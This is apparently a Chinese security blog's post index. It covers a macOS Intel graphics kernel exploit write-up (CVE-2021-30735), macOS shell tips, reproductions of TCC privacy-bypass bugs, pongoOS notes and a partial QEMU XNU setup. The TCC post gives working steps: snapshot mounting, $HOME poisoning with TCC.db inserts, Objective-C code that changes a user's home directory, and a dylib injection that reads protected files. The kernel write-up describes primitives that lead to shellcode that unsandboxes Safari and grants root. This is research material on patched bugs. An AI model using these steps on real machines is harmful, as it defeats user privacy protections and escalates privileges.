mach_port_set_attributes 的 MACH_port_LIMITS_INFO 语句设置为 0。因此，所有3个字段都可以是0，满足io_lock_data的约束。 ip_srights字段记录了一个端口所存在的发送权限的数量。发送含有发送权的端口描述符的mach消息时，这个字段会增加1。类似地，在同一消息中发送N个有发送权的端口描述符，会增加N个。 ikmq_base字段指向接收队列头部的ipc_kmsg。这个结构包含许多有趣的字段，在这种情况下，最相关的将是ikm_header，一个指向消息正文的指针。 由于假端口的ip_srights字段与B-&gt;ikmq_base重叠，我们可以发送假端口的端口描述符来增加B-&gt;ikmq_base，同样也可以接收这些端口描述符来解压缩/解扰。这就引出了一个问题：B-&gt;ikmq_base的增量可以指向什么，或者换句话说，通常位于ipc_kmsg结构之后的东西。 在发送消息时，如果消息体足够小，那么消息体就会在ipc_kmsg结构之后内联存储，否则就会放在一个单独的分配中（这个逻辑在ipc_kmsg_alloc中）。如果发送给B的消息是这样的消息，将ikmq_base增加适当的次数将直接指向内联体，这是完全受控的。 我们现在有能力完全伪造B的接收队列头部的ipc_kmsg。具体来说，我们将把对B-&gt;ikmq_base-&gt;ikm_header的控制变成一个受限的任意读取。 一般的想法是重复以下内容： 向B发送一个小消息，以假的ipc_kmsg内容为主体； 到一个独立的辅助端口，使用端口描述符向假端口发送N个发送权限，增加B-&gt;ikmq_base； 在B上执行一些非破坏性的操作，以使用假的ikm_header来进行约束性的阅读； 接收端口描述符，将B-&gt;ikmq_base递减到正常值； 从B处接收清空队列，根据需要用一个新的假的ipc_kmsg重复。 Pseudo-arbitrary Kernel Memory Read我们可以用2种方法将假的ikm_header利用到读原语中。 方法1第一个使用MACH_RCV_LARGE，这是一个在接收Mach消息时可以指定的标志。如果这个标志被设置，并且要接收的消息大于用户空间接收缓冲区的大小，内核就会把消息留在队列中，并向用户空间写出需要的空间。 所需的大小由ipc_kmsg_copyout_size计算。这个计算是必要的，因为当从用户空间复制进来的时候，端口名（32位）被转换成相应的指针（64位），所以从内核和用户空间的角度来看，有一个大小的差异。所需的大小被计算为ikm_header-&gt;msgh_size - 8，然后如果信息是复杂的，每个端口描述符都会发生额外的减法。 对于text（代码地址）泄露，我们想读出我们之前泄露的数据指针的OSData对象的vtable。我们将把ikm_header指向OSData - 4，然后尝试用一个非常小的接收缓冲区接收消息，并设置MACH_RCV_LARGE选项。 msgh_size与vtable的低4字节重合。内核ASLR没有提供足够的熵来随机化内核滑块的高32位，所以我们实际上有了我们的text泄漏。 这里的一个限制是OSData之前的内存必须被映射，因为ipc_kmsg_copyout_size会使用msgh_bits检查消息是否复杂。安全的做法是重复泄漏过程，直到找到一个非页对齐的OSData，确保OSData-4将被映射。 第二个潜在的问题是我们不知道msgh_bits是否会有复杂位被设置。如果它没有，一切都很好。如果有，msgh_descriptor_count（复杂信息中描述符的数量）将与OSData的容量重叠。通过分配OSData的大小为0，容量也将同样为0。这将确保不会对端口描述符的msgh_size进行额外减法。 方法2第二个受限的读取方法使用mach_port_peek。以前，我们用mach_port_peek和一个损坏的msgh_size来读取一个越界的trailer。这一次，我们控制ikm_header来代替。trailer是从ikm_header + ikm_header-&gt;msgh_size读取的，所以我们需要确保有一个合适的假msgh_size。最简单的是在我们希望读取的数值前不久在内存中找到一个零，这样trailer就会直接从假的ikm_header中复制出来，而不用进行加法。 我们将使用这种技术来泄露受控数据的地址。我们首先创建一个辅助端口，用前面使用的老式mach_port_peek技术泄露其地址。然后我们向这个端口发送一个大的mach消息，它将在虚拟内存的末端，在资源缓冲区dbuf0的一个恒定偏移处分配消息体。使用伪任意的mach_port_peek读取，我们就可以遍历ipc_port对象，找到消息体指针。减去适当的偏移量，我们就得到了dbuf0的地址。这个内存是在内核和用户空间之间共享的，所以我们有一个包含受控数据的内核地址。 Arbitrary Function Call Primitive有了text泄漏和共享内存资源缓冲区的地址，我们可以继续劫持控制流。我们分配了一个大的OSArray，并破坏了一个指向资源缓冲区的入口。 这给了我们一个假的C++对象的控制，即vtable控制。 为了启动一个虚拟调用，我们从其相关的IOSurface查询被破坏的OSArray。代码首先在序列化之前复制被查询的值。在这种情况下，拷贝是由OSArray::copyCollection执行的，它调用OSArray::initWithObjects来使用现有对象初始化一个新数组。这就在后备存储上进行了迭代，并通过虚拟调用 taggedRetain 来保留每个对象（其中第一个对象我们已经损坏了）。这给了我们一个任意的函数调用，其中有一个受控的this参数。 我们把这个调用指向OSSerializer::serialize： 123OSSerializer::serialize(OSSerializer* this, OSSerialize* s) { return this-&gt;callback(this-&gt;target, this-&gt;ref, s);} 我们现在有一个控制前两个参数的任意的函数调用。通过将这个调用引导回OSSerialize::serialize，我们可以利用s参数来获得一个有3个受控参数的任意函数调用。这个方法以前也用过。 从被劫持的taggedRetain调用返回后，我们将回到OSArray::initWithObjects中，如果在数组中遇到一个空条目，它将中止复制。我们使用这种行为来干净地跳出。 有了这个基元，任意的读/写就简化为调用copyin和copyout函数。 Kernel Shellcode Execution从这里开始，作为内核获得任意代码执行是相对简单的。 我们用kmem_alloc_external为shellcode分配内存，然后用copyin把它复制进去。似乎没有一个方便的方法来标记这个只有3个受控参数的内存rwx，所以我们使用vm_map_store_lookup_entry来查找与shellcode内存相关的vm_map_entry_t，它包含映射的权限位。覆盖这些位就足以标记该条目为rwx。最后，我们调用shellcode本身。 shellcode重写了内核版本字符串（可通过uname -a查看），取消了当前进程（Apple Safari）的沙盒，并给予它root证书。漏洞利用在这里。 总结这个漏洞最困难的部分可能是对信息泄露的需求，这使得这个漏洞偏离了重点，绕过了端口的zone_require缓解。自Pwn2Own 2021以来，沙盒的变化禁止了某些函数调用，这使得这种技术在Safari沙盒中是可行的，尽管有可能稍微修改该技术以绕过这些新限制。 这里讨论的漏洞已经在macOS Big Sur 11.4中打了补丁，并分配了CVE-2021-30735。 复现情况虚拟机中运行会说找不到IntelAccelerator这个服务，好像是和虚拟机没有启用3D图形加速有关，但是VMware设置时显示无法为这个虚拟机开启图形加速，或许应该换PD试一试，另外，本地测试获取这个服务是没问题的。","link":"/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/"},{"title":"macOS安全技巧","text":"查找应用程序的Bundle IDApp Bundle ID（Bundle IDentifier）是系统APP唯一bai识别du的ID。其用来捆绑识别用，表明应用和其他App的区别。 Bundle ID在应用程序Bundle的Info.plist文件中设置，并在Bundle写入磁盘后立即注册到Launch Services数据库中。 1lsappinfo list | grep 查找缺少Hardened Runtime的应用程序从macOS 10.15 Catalina开始，默认情况下，所有的应用程序都必须经过公证才能启动，但是有一些免责条款意味着你的系统中可能有未经公证的应用程序。没有这种标志的应用程序可以被恶意进程修改。 1for i in /Applications/*.app; do codesign -dv &quot;${i}&quot; &amp;&gt;&gt; /tmp/codes; done; grep -B3 'none' /tmp/codes | grep ^Executable | sed 's/^Executable=/No\\ Hardened\\ Runtime:\\ /g'; rm -rf /tmp/codes 检查应用程序是否没有公证“票证” 1for i in /Applications/* ; do stapler validate &quot;${i}&quot;|grep -B 1 -v worked;done 查找连接到局域网的设备打印出连接到LAN的设备的信息，包括本地IP地址、MAC地址(又称链路层地址)和失效时间等。 没有扫描到连接到同一Wi-Fi的手机，可能不是这么用的。 1while true; do clear; arp -alnx; c=$(arp -alnx | wc -l); let n=$c-1; printf '\\tCount: \\t'$n'\\n'; sleep 2; done; 对文件进行inflate处理，改变它的哈希命令 1for i in {1..3000000}; do echo '0' &gt;&gt; 目标文件; done 查找所有日志子系统的名称命令 1ls -al /System/Library/Preferences/Logging/Subsystems | awk '{print $9}' | sed 's/.plist//g' 然后可以将日志输出缩小范围（有点问题） 1log stream --predicate 'subsystem ==&quot;com.apple.kext&quot;' 查找具有完全磁盘访问权限的应用程序1sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db &quot;SELECT client,allowed FROM access WHERE service == 'kTCCServiceSystemPolicyAllFiles'&quot; | grep '1'$ 获取Mac的UUID, Board-ID命令 1ioreg -rd1 -c IOPlatformExpertDevice | grep UUID | awk '{print $NF}' | sed 's/\\&quot;//g' 或 1/usr/sbin/system_profiler SPHardwareDataType | grep UUID | awk '{print $NF}' system_profiler获得完整的硬件概述，提供了大量有用的环境信息。 将十六进制字符串转换为ASCII123456mob@vul ~ echo 'hello world' | xxd -p68656c6c6f20776f726c640amob@vul ~ echo '68656c6c6f20776f726c640a' | xxd -r -phello worldmob@vul ~ python -c &quot;print bytearray.fromhex('68656c6c6f20776f726c640a')&quot;hello world 或 1echo 'hello world' | od -t c -t x1 批量将PNG图像文件夹转换为JPEG遍历当前工作目录中的所有图像，创建一个名为“JPEGS”的新文件夹，并使用JPEG格式的所有PNG副本填充该文件夹。 这个命令没试过 1mkdir jpegs; sips -s format jpeg *.* --out jpegs 隐藏/取消隐藏桌面文件12mob@vul ~ chflags hidden ~/Desktop/*mob@vul ~ chflags nohidden ~/Desktop/* 编码/解码URL字符串123456mob@vul ~ alias urldecode='python3 -c &quot;import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))&quot;'mob@vul ~ urldecode TCC%20bypass\\&amp;src\\=typed_query\\&amp;f\\=liveTCC bypass&amp;src=typed_query&amp;f=livemob@vul ~ alias urlencode='python3 -c &quot;import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))&quot;'mob@vul ~ urlencode &quot;TCC bypass&amp;src=typed_query&amp;f=live&quot;TCC+bypass%26src%3Dtyped_query%26f%3Dlive","link":"/2022/01/18/macOS%E5%AE%89%E5%85%A8%E6%8A%80%E5%B7%A7/"},{"title":"macOS的一些TCC绕过漏洞","text":"前言看了微软的这篇文章https://www.microsoft.com/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/，觉得可以稍微整理一下相关的漏洞，用来后面构成exploit-chain。 背景知识TCC 维护包含应用请求同意历史记录的数据库。通常，当应用程序请求访问受保护的用户数据时，可能会发生以下两种情况之一： 如果应用程序和请求类型在 TCC 数据库中有记录，则数据库条目中的标志指示是否允许或拒绝请求而无需自动且无需任何用户交互。 如果应用程序和请求类型在 TCC 数据库中没有记录，则会向用户显示提示，由用户决定是授予还是拒绝访问。所述决定被备份到数据库中，因此随后的类似请求现在将属于第一种情况。 有两种 TCC 数据库。每种类型只维护请求类型的一个子集： 用户特定数据库：包含仅适用于特定用户配置文件的存储权限类型；它保存在~/Library/Application Support/com.apple.TCC/TCC.db 下，拥有该配置文件的用户可以访问 系统范围的数据库：包含适用于系统级别的存储权限类型；它保存在/Library/Application Support/com.apple.TCC/TCC.db 下，可以由具有 root 或全盘访问权限的用户访问 macOS 通过使用一个名为tccd的特殊守护进程来实现 TCC 逻辑。实际上，至少有两个 tccd 实例：一个由用户运行，另一个由 root 运行。 查看TCC的数据库文件，可以看到一个csreq的字段，该字段可以手动生成： 1234567891011mob@vul ~ codesign -d -r- /Applications/Visual\\ Studio\\ Code.appExecutable=/Applications/Visual Studio Code.app/Contents/MacOS/Electrondesignated =&gt; identifier &quot;com.microsoft.VSCode&quot; and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = UBF8T346G9 mob@vul ~ echo 'identifier &quot;com.microsoft.VSCode&quot; and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = UBF8T346G9' | csreq -r- -b /tmp/csreq.bin mob@vul ~ xxd -p /tmp/csreq.binfade0c00000000a000000001000000060000000600000006000000060000000200000014636f6d2e6d6963726f736f66742e5653436f64650000000f0000000e000000010000000a2a864886f763640602060000000000000000000e000000000000000a2a864886f7636406010d0000000000000000000b000000000000000a7375626a6563742e4f550000000000010000000a554246385433343647390000 修改TCC数据库问价需要如果授予用户完整的磁盘访问权限。 漏洞Time Machine 挂载(CVE-2020-9771)macOS 提供了一个名为Time Machine的内置备份和恢复解决方案。发现可以使用“ noowners ”标志安装 Time Machine 备份（使用apfs_mount实用程序）。由于这些备份包含TCC.db文件，攻击者可以挂载这些备份并确定设备的 TCC 策略，而无需完全访问磁盘。 已在 5 月 26 日的 macOS Catalina 10.15.4 和 Mojave 中得到修复。 这个错误有两个独立的问题，这些问题的结合成为了一个非常强大的系统范围的访问。 TCC 隐私不会在挂载的本地快照上强制执行，允许有人挂载它并访问其中的任何文件，包括那些通常受隐私保护的文件 所有用户都可以启动 APFS 快照，即使是低权限用户，也可以列出这些用户。除此之外，所有用户都可以挂载本地 APFS 快照，即使是低权限的快照，如果与noowners标志一起使用，低权限用户可以通过本地快照访问所有数据，包括所有其他用户的数据（甚至是高权限用户的数据）。 noowners标志的意思是：忽略整个卷的所有权字段。这会导致所有对象显示为用户 ID 99 和组 ID 99 拥有。用户 ID 99 被解释为当前有效的用户 ID，而组 ID 99 直接使用并转换为“unknown”。 复现先创建一个本地快照 1tmutil localsnapshot 再列举已创建的快照 123456tmutil listlocalsnapshots /# 输出# Snapshots for volume group containing disk /:# com.apple.TimeMachine.2019-11-17-133110.local# com.apple.TimeMachine.2019-11-17-133316.local# com.apple.TimeMachine.2019-11-17-141812.local 使用noowners挂载快照 1mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap 然后就可以进快照，查看想看的文件 1cd /tmp/snap/Users/* 最后，还有一点限制就是FileVault，如果开启了FileVault，则数据会被加密，作为guest的用户就看不到了。所以如果没有开启，则可以通过guest账户进行越权读取了。 环境变量中毒(CVE-2020-9934)发现用户的tccd可以通过扩展*$HOME/Library/Application Support/com.apple.TCC/TCC.db来构建TCC.db文件的路径。由于用户可以操纵$HOME环境变量（由launchd引入tccd），攻击者可以将选定的TCC.db文件植入任意路径，毒化$HOME环境变量，并让TCC.db*使用该文件。 已在iOS 13.6、iPadOS 13.6和macOS Catalina 10.15.6上进行了修复。 能够直接写入数据库完全违背了 TCC 的目的，因此 Apple 使用 TCC 和系统完整性保护 (SIP) 来保护这个数据库本身。即使以 root 身份运行的程序也无法修改此数据库，除非它具有com.apple.private.tcc.manager和com.apple.rootless.storage.TCC权限。但是，从技术上讲，数据库仍然由当前运行的用户拥有和读写，所以只要我们能找到具有这些权限的程序，我们就可以控制数据库。 由于 TCC 守护进程直接负责读取和写入 TCC 数据库，所以这个漏洞就是针对 TCC 守护进程进行的。 当 TCC 守护进程尝试打开数据库时，程序会尝试$HOME/Library/Application Support/com.apple.TCC/TCC.db，所以利用的关键就是控制$HOME变量。 由于TCC守护进程是由launchd启动的，因此，可以将launchctl的$HOME变量指向我们控制的目录，重新启动 TCC 守护程序，然后直接修改 TCC 数据库，为自己提供所有可用的 TCC 权利，而无需提示最终用户。 复现123456789101112131415161718192021222324# 重置数据库$&gt; tccutil reset All# 从 ~/Library 模仿 TCC 的目录结构$&gt; mkdir -p &quot;/tmp/tccbypass/Library/Application Support/com.apple.TCC&quot;# cd 进入新目录$&gt; cd &quot;/tmp/tccbypass/Library/Application Support/com.apple.TCC/&quot; # 设置 launchd $HOME 到这个临时目录$&gt; launchctl setenv HOME /tmp/tccbypass# 重启 TCC 守护进程$&gt; launchctl stop com.apple.tccd &amp;&amp; launchctl start com.apple.tccd# 打印出 TCC 数据库的内容，然后让终端访问 Documents $&gt; sqlite3 TCC.db .dump $&gt; sqlite3 TCC.db &quot;INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder', 'com.apple.Terminal', 0, 1, 1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003', NULL, NULL, 'UNUSED', NULL, NULL, 1333333333333337);&quot;# 列出 Documents 目录而不提示最终用户$&gt; ls ~/Documents Desktop等目录确实是不提示，但是，其他的就不行了，屏幕和完全文件访问权限，暂时不知道为什么。 修改用户主目录(CVE-2020-27937)已在macOS Big Sur 11.2上进行修复 复现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// compile cmd: clang -framework Foundation -framework OpenDirectory tccbypass.m -o tccbypass#import &lt;Foundation/Foundation.h&gt;#import &lt;OpenDirectory/OpenDirectory.h&gt;#define NEW_HOME_DIRECTORY @&quot;/tmp/tccbypass&quot;#define USER_UID @&quot;501&quot;ODRecord* getUsersRecord() { NSError *err = nil; ODSession *session = [ODSession defaultSession]; ODNode *node = [ODNode nodeWithSession:session type:kODNodeTypeLocalNodes error:&amp;err]; if(err != nil) { NSLog(@&quot;%@&quot;, [err localizedDescription]); exit(0); } ODQuery *getNFSHomeDirectory = [ODQuery queryWithNode:node forRecordTypes:kODRecordTypeUsers attribute:kODAttributeTypeUniqueID matchType:kODMatchEqualTo queryValues:USER_UID returnAttributes:kODAttributeTypeStandardOnly maximumResults:1 error:&amp;err]; if(err != nil) { NSLog(@&quot;%@&quot;, [err localizedDescription]); exit(0); } NSArray *foundRecords = [getNFSHomeDirectory resultsAllowingPartial:NO error:&amp;err]; return foundRecords.firstObject;}NSString* getUsersNFSHomeDirectory(ODRecord *userRecord) { NSError *err = nil; NSString *nfsHomeDirectory = [userRecord valuesForAttribute:kODAttributeTypeNFSHomeDirectory error:&amp;err].firstObject; if(err != nil) { NSLog(@&quot;%@&quot;, [err localizedDescription]); exit(0); } return nfsHomeDirectory;}BOOL changeUsersNFSHomeDirectory(ODRecord *userRecord) { NSError *err = nil; BOOL result = [userRecord setValue:NEW_HOME_DIRECTORY forAttribute:kODAttributeTypeNFSHomeDirectory error:&amp;err]; if(err != nil) { NSLog(@&quot;%@&quot;, [err localizedDescription]); exit(0); } return result;}__attribute__((constructor)) static void pwn() { NSLog(@&quot;Injected...&quot;); ODRecord *userRecord = getUsersRecord(); NSString *homeDirectory = [userRecord recordName]; NSLog(@&quot;Got OD node of user: %@&quot;, homeDirectory); NSString *nfsHomeDirectory = getUsersNFSHomeDirectory(userRecord); NSLog(@&quot;User's NFSHomeDirectory: %@&quot;, nfsHomeDirectory); BOOL result = changeUsersNFSHomeDirectory(userRecord); if(result == YES) { NSLog(@&quot;Successfully changed user's NFSHomeDirectory&quot;); } else { NSLog(@&quot;Exploit was unable to change user's NFSHomeDirectory&quot;); } nfsHomeDirectory = getUsersNFSHomeDirectory(userRecord); NSLog(@&quot;User's NFSHomeDirectory: %@&quot;, nfsHomeDirectory); exit(0); }int main(int argc, char* argv[]){ pwn(); return 0;} root权限运行完后，重新打开shell，这时~就会变成修改后的目录，访问桌面等文件夹也不会有提示。但是运行sudo的时候，会有弹窗提示，运行完后，访问屏幕也还是会有提示。 Bundle 结论问题(CVE-2021-30713)该漏洞滥用了 macOS 推断应用程序包信息的方式。例如，假设攻击者知道通常具有麦克风访问权限的特定应用程序。在这种情况下，他们可以将其应用程序代码植入目标应用程序的包中，并“继承”其 TCC 功能。 已在macOS Big Sur 11.4上进行了修复。 这个漏洞被用于APT攻击，以偷偷截取用户桌面。 “powerdir”漏洞看一下CVE-2020-9934的补丁 打了补丁之后，TCC.db路径是通过user_password-&gt;pw_dir来获取的，这样不管$HOME变量怎么设置，是不影响后面的TCC的。 复现按以下步骤试了几次，没有成功修改home目录。 123456# 1.获取指定应用的csreq blob# 2.制作一个假的TCC.db，设置需要的权限和csreq blob# 3.使用dsexport导出用户的目录服务# 4.修改用户目录服务entry以修改用户的home目录# 5.使用dsimport导入修改后的目录服务entry# 6.重启tccd进程 绕过技术iTerm2也可以是其他任何程序，这里以iTerm2为例，假定其具有全盘访问权限。 可以通过以下命令看到： 12345$ sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.dbSQLite version 3.36.0 2021-06-18 18:58:49Enter &quot;.help&quot; for usage hints.sqlite&gt; SELECT service, client, hex(csreq), auth_value FROM access WHERE client=&quot;com.googlecode.iterm2&quot;;kTCCServiceSystemPolicyAllFiles|com.googlecode.iterm2|FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000|2 下面base64编码的来源，是FADE0...00（二进制数据）转base64得来的，使用以下代码解码csreq： 1234567891011121314151617// clang -framework Foundation -framework Security tcc.m -o tcc#import &lt;Foundation/Foundation.h&gt;#import &lt;Security/Security.h&gt;int main(int argc, const char* argv[]) { NSString* base64CSReq = @&quot;+t4MAAAAAMQAAAABAAAABgAAAAYAAAAPAAAAAgAAABVjb20uZ29vZ2xlY29kZS5pdGVybTIAAAAAAAAHAAAADgAAAAAAAAAKKoZIhvdjZAYBCQAAAAAAAAAAAAYAAAAGAAAADgAAAAEAAAAKKoZIhvdjZAYCBgAAAAAAAAAAAA4AAAAAAAAACiqGSIb3Y2QGAQ0AAAAAAAAAAAALAAAAAAAAAApzdWJqZWN0Lk9VAAAAAAABAAAACkg3VjdYWVZRN0QAAA==&quot;; NSData* csReqData = [[NSData alloc] initWithBase64EncodedString:base64CSReq options:0]; SecRequirementRef secRequirement = NULL; SecRequirementCreateWithData((__bridge CFDataRef)csReqData, kSecCSDefaultFlags, &amp;secRequirement); CFStringRef requirementText = NULL; SecRequirementCopyString(secRequirement, kSecCSDefaultFlags, &amp;requirementText); NSLog(@&quot;decoded csreq: %@&quot;, (__bridge NSString*)requirementText); return 0;}// output// 2022-03-15 11:02:02.520 tcc[72892:3255935] decoded csreq: anchor apple generic and identifier &quot;com.googlecode.iterm2&quot; and (certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = H7V7XYVQ7D) 从这串解码后的字符串可以看出，csreq包含： 应用程序的捆绑标识符信息 用于签署应用程序的开发者证书 利用思路：可以获取旧版本的“donate”应用程序（没有hardened runtime标志），注入它，从而滥用其 TCC 权限。 ⚠️从macOS 10.15 Catalina开始，默认情况下，所有的应用程序都必须经过公证才能启动。没有这个标志，意味着程序可以被恶意进程修改。 没有则flags=0x0(none)，有则flags=0x10000(runtime) 复现下载一个旧版本的iTerm2-2_1_4.zip，查看签名信息，没有hardened runtime标志，但有相同的csreq。 1234567891011pwn@pwns-Mac ~ % codesign -d -v -r- ~/Desktop/iTerm.app Executable=/Users/pwn/Desktop/iTerm.app/Contents/MacOS/iTermIdentifier=com.googlecode.iterm2Format=app bundle with Mach-O universal (i386 x86_64)CodeDirectory v=20200 size=15145 flags=0x0(none) hashes=750+3 location=embeddedSignature size=8549Timestamp=Oct 4, 2015 at 9:18:53 PMInfo.plist entries=33TeamIdentifier=H7V7XYVQ7DSealed Resources version=2 rules=12 files=82designated =&gt; identifier &quot;com.googlecode.iterm2&quot; and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = H7V7XYVQ7D 编译一个恶意的dylib： 123456789#import &lt;Foundation/Foundation.h&gt;__attribute__((constructor)) static void pwn(int argc, const char **argv) { NSLog(@&quot;[+] injected to %@&quot;, [[NSBundle mainBundle] bundleIdentifier]); NSString *path = [@&quot;~/Desktop/secret_data.txt&quot; stringByExpandingTildeInPath]; NSString *contents = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil]; NSLog(@&quot;[+] Contents of TCC-protected file: %@&quot;, contents);} 通过命令行进行注入，不过没成功，显示open命令没有env选项： 1open /tmp/iTerm2-2_1_4.app --env DYLD_INSERT_LIBRARIES=/tmp/libtccChecker.dylib 大概通过DYLD_INSERT_LIBRARIES实现的： 1DYLD_INSERT_LIBRARIES=~/Desktop/mal.dylib ~/Desktop/iTerm.app/Contents/MacOS/iTerm 能看到注入成功的输出结果： 122022-03-14 21:44:58.416 iTerm[831:13729] [+] injected to com.googlecode.iterm22022-03-14 21:44:58.416 iTerm[831:13729] [+] Contents of TCC-protected file: password","link":"/2022/01/11/macOS%E7%9A%84%E4%B8%80%E4%BA%9BTCC%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"title":"pongoOS学习记录","text":"介绍pongoOS是一个为Apple打造的预启动执行环境，一个简易操作系统。 ⚠️ 由于checkra1n是利用checkm8漏洞来实现pongoOS的，所以只支持A7-A11。 checkra1n利用checkm8漏洞将pongoOS注入到iBoot中，pongoOS通过内存Hook劫持iBoot，在iBoot末尾启动自身，pongoOS执行后加载KPF(Kernel Patch Finder)内核模块。 编译源码链接：https://github.com/checkra1n/pongoOS Mac上只需要make all即可。 主要生成以下4个产物： Pongo，PongoOS的Mach-O文件 Pongo.bin，与上面相同，但作为可以跳转到的裸机二进制文件 checkra1n-kpf-pongo， checkra1n 内核补丁查找器，作为 Pongo 模块 (Mach-O/kext) PongoConsolidated.bin， PongoOS 和 KPF 合并成一个二进制文件 用法USB连接设备 123checkra1n -k Pongo.bin # Boots to Pongo shell, KPF not availablecheckra1n -k PongoConsolidated.bin # Auto-runs KPF and boots to XNUcheckra1n -k PongoConsolidated.bin -p # Loads KPF, but boots to Pongo shell","link":"/2021/12/12/pongoOS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"qemu xnu内核调试环境搭建","text":"前言开始看一些xnu内核的漏洞，发现有时候没有对应的硬件设备去调试，因此，整理一下qemu的方式。 下面一边看资料，一边整理。 实现原理QEMU模拟是从kernelcache开始的，没有iBoot/Secure ROM阶段。 下载的ipsw包里包含kernelcache和rfs，然后根据iOS启动流程，设置好相应的数据，如DT、boot-args等，将这些数据传给XNU即可。所以主要是需要逆向iBoot，iBoot有泄漏的源码。 具体步骤第一步，获取ipsw文件iOS 12.1 更新文件，然后解压出来，各个文件的具体意思，可以在theiphonewiki上看到。 123456789# 解压后的目录结构048-31952-103.dmg048-32459-105.dmg048-32651-104.dmgBuildManifest.plistFirmware/Restore.plistkernelcache.release.iphone7kernelcache.release.n66 第二步，工具准备xnu-qemu-arm64-tools1git clone https://github.com/alephsecurity/xnu-qemu-arm64-tools xnu-qemu-arm641git clone https://github.com/alephsecurity/xnu-qemu-arm64 xnu源码1git clone https://github.com/apple/darwin-xnu.git AARCH64 的交叉编译器12brew tap SergioBenitez/osxctbrew install aarch64-none-elf rootlessJB1git clone https://github.com/jakeajames/rootlessJB 第三步，提取 ASN1 编码的内核映像1python3 xnu-qemu-arm64-tools/bootstrap_scripts/asn1kerneldecode.py iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66 iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.asn1decoded 解码后的内核映像包含 lzss 压缩内核，进行解压： 1python3 xnu-qemu-arm64-tools/bootstrap_scripts/decompress_lzss.py iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.asn1decoded iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.out 第四步，从 ASN1 编码文件中提取设备树1xnu-qemu-arm64-tools/bootstrap_scripts/asn1dtredecode.py iPhone_5.5_12.1_16B92_Restore/Firmware/all_flash/DeviceTree.n66ap.im4p iPhone_5.5_12.1_16B92_Restore/Firmware/all_flash/DeviceTree.n66ap.im4p.out 第五步，为 iOS 系统创建磁盘设备1. 创建主磁盘设备iOS 内核的自定义块设备驱动程序为了能够在驱动程序代码中使用iOS内核中的函数，需要将驱动程序与内核中的符号链接起来。 提取符号： 1nm iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.out &gt; iPhone_5.5_12.1_16B92_Restore/symbols.nm 创建环境变量1234export XNU_SOURCES=full_path_to_darwin-xnuexport KERNEL_SYMBOLS_FILE=full_path_to_symbols.nmexport QEMU_DIR=full_path_to_xnu-qemu-arm64export NUM_BLOCK_DEVS=2 编译编译生成一个 flat 文件bin/aleph_bdev_drv.bin。 1make -C xnu-qemu-arm64-tools/aleph_bdev_drv 直接编译会报错，需要先切换xnu的源码。 1git checkout xnu-4903.270.47 生成后，将aleph_bdev_drv.bin复制到工作目录。 2. 解码 ramdisk将 ramdisk 设备和主磁盘映像挂载到计算机。 12345python3 xnu-qemu-arm64-tools/bootstrap_scripts/asn1rdskdecode.py iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg.outcp iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg.out ./hfs.mainhdiutil resize -size 6G -imagekey diskimage-class=CRawDiskImage ./hfs.mainhdiutil attach -imagekey diskimage-class=CRawDiskImage ./hfs.mainhdiutil attach iPhone_5.5_12.1_16B92_Restore/048-31952-103.dmg 删除 ramdisk 的所有内容并将 ramdisk 与主磁盘映像同步。 1234sudo diskutil enableownership /Volumes/PeaceB16B92.arm64UpdateRamDisk/sudo rm -rf /Volumes/PeaceB16B92.arm64UpdateRamDisk/*sudo rsync -av /Volumes/PeaceB16B92.N56N66OS/* /Volumes/PeaceB16B92.arm64UpdateRamDisk/sudo chown root /Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64 删除/private/var。 1sudo rm -rf /Volumes/PeaceB16B92.arm64UpdateRamDisk/private/var/* 3. 获取预编译的二进制文件1234cd rootlessJB/rootlessJB/bootstrap/tars/tar xvf iosbinpack.tarsudo cp -R iosbinpack64 /Volumes/PeaceB16B92.arm64UpdateRamDisk/cd - 4. 添加要在系统启动时执行的程序四个可执行文件将添加到 Launch Daemons目录中，以便在系统加载时启动。 bash 创建plist文件并将其另存为/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/bash.plist。 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; 